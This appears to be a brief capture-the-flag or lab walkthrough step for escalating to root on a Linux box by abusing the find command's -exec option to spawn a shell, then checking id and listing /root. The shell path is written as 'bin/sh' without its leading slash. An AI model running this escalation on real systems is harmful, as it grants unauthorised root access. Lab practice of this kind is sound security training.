Try priviledge escaltion by means of breakout Run: 
```
cd
touch DC1
find DC1 -exec "bin/sh" \;
```

Once that is done, check your priviledges:
```
id
```

Might be root now
```
cd /root
ls
```
